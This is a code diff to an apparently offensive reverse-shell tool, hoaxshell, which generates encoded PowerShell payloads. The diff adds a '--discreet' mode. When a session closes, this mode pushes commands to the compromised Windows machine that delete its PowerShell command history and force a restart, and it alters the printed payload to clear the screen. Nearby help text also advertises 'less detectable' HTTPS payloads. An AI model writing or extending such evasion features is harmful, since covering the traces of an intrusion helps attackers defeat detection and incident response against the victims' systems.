@@ -83,6 +83,7 @@ parser.add_argument("-g", "--grab", action="store_true", help = "Attempts to res
 parser.add_argument("-t", "--trusted-domain", action="store_true", help = "If you own a domain, use this option to generate a shorter and less detectable https payload by providing your DN with -s along with a trusted certificate (-c cert.pem -k privkey.pem). See usage examples for more details.")
 parser.add_argument("-u", "--update", action="store_true", help = "Pull the latest version from the original repo.")
 parser.add_argument("-q", "--quiet", action="store_true", help = "Do not print the banner on startup.")
+parser.add_argument("-d", "--discreet", action="store_true", help = "Cover execution traces by deleting command history and rebooting (Default: false)")
 
 args = parser.parse_args()
 
@@ -161,8 +162,12 @@ def promptHelpMsg():
 
 def encodePayload(payload):
 	enc_payload = "powershell -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()
-	print(f'{PLOAD}{enc_payload}{END}')
-
+	
+	if args.discreet:
+		print(f'{PLOAD}{enc_payload} &;clear{END}')
+	else:
+		print(f'{PLOAD}{enc_payload}{END}')
+     
 
 
 def is_valid_uuid(value):
@@ -406,6 +411,13 @@ class Hoaxshell(BaseHTTPRequestHandler):
 	def dropSession():
 
 		print(f'\r[{WARN}] Closing session elegantly...')
+
+		if args.discreet:
+			print(f'\r[{WARN}] Removing command history ...')
+			Hoaxshell.command_pool.append('Remove-Item (Get-PSReadlineOption).HistorySavePath')
+			
+			print(f'\r[{WARN}] Restarting computer ...')
+			Hoaxshell.command_pool.append('Restart-Computer -Force')
 		
 		if not args.exec_outfile:
 			Hoaxshell.command_pool.append('exit')
